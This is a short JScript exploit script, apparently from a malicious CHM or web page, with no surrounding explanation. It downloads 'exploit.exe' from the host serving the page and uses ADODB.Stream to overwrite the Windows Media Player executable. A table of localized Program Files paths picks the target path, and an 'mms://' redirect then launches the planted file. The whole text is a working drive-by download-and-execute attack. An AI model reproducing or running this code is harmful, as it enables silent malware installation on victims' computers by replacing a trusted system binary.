<script id="oClientCaps" language="JScript.Encode" STYLE="behavior:url(#default#clientCaps)">

    var pathMappings = {}
    
    pathMappings["default"] = "c:\\Program files";
    
    pathMappings["dk"] = "C:\\Programmer\\Windows Media Player\\wmplayer.exe";
    pathMappings["fi"] = "c:\\Program\\Windows Media Player\\wmplayer.exe";
    pathMappings["de"] = "c:\\Programme\\Windows Media Player\\wmplayer.exe";
    pathMappings["it"] = "c:\\Programmi\\Windows Media Player\\wmplayer.exe";
    pathMappings["no"] = "c:\\Programfiler\\Windows Media Player\\wmplayer.exe";
    pathMappings["pt"] = "C:\\Programas\\Windows Media Player\\wmplayer.exe";
    pathMappings["es"] = "C:\\Archivos de programa\\Windows Media Player\\wmplayer.exe";
    pathMappings["se"] = "C:\Program\\Windows Media Player\\wmplayer.exe";


    function getPath(url) {
        start = url.indexOf('http:')
        end = url.indexOf('EXPLOIT.CHM')
        return url.substring(start, end);
    }
    
    payloadURL = getPath(location.href)+'exploit.exe';
    
    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET",payloadURL,0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile(pathMappings[oClientCaps.systemLanguage.toLowerCase()]!=null?pathMappings[oClientCaps.systemLanguage.toLowerCase()]:"C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    location.href = "mms://";
    
</script>